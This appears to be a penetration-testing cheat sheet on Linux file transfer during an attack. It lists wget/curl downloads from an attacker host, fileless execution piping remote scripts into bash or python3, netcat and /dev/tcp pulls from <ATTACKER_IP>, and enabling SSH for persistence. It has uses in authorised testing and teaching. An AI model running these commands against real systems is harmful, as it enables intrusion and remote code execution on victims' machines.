# Linux Transfer
```table-of-contents
```
## Web Downloads (HTTP/HTTPS)
### Wget & Curl
```shell
# Wget
wget https://<ATTACKER_IP>/file -O /tmp/file

# Curl
curl -o /tmp/file https://<ATTACKER_IP>/file
```
### Fileless Execution (Memory Only)
```shell
# Bash Script
curl https://<ATTACKER_IP>/script.sh | bash

# Python Script
wget -qO- https://<ATTACKER_IP>/script.py | python3
```
## Netcat & Ncat Transfers
### Method 1: Attacker connects to Victim (Push)
**1. Victim (Receiver):**
```shell
# Original Netcat
nc -l -p 8000 > file_saved

# Ncat (Modern)
ncat -l -p 8000 --recv-only > file_saved
```
**2. Attacker (Sender):**
```shell
# Original Netcat (-q 0 closes connection after EOF)
nc -q 0 <VICTIM_IP> 8000 < file_to_send

# Ncat
ncat --send-only <VICTIM_IP> 8000 < file_to_send
```
### Method 2: Victim connects to Attacker (Pull)
**1. Attacker (Sender):**
```shell
# Listen and serve the file
sudo nc -l -p 443 -q 0 < file_to_send
# OR
sudo ncat -l -p 443 --send-only < file_to_send
```
**2. Victim (Receiver):**
```shell
# Connect and download
nc <ATTACKER_IP> 443 > file_saved
# OR
ncat <ATTACKER_IP> 443 --recv-only > file_saved
```
### Method 3: /dev/tcp (Bash Only)
```shell
# Connect to Attacker's listener and write to file
cat < /dev/tcp/<ATTACKER_IP>/443 > file_saved
```
## SSH Transfers (SCP)
```shell
# Download (Remote -> Local)
scp user@<TARGET_IP>:/tmp/file.txt .

# Upload (Local -> Remote)
scp file.txt user@<TARGET_IP>:/tmp/
```
### Enabling SSH Server (Persistence)
```shell
sudo systemctl enable ssh
sudo systemctl start ssh
```
## Python Utilities
### UnZip
```python
import zipfile
with zipfile.ZipFile('upload.zip', 'r') as zip_ref:
    zip_ref.extractall()
```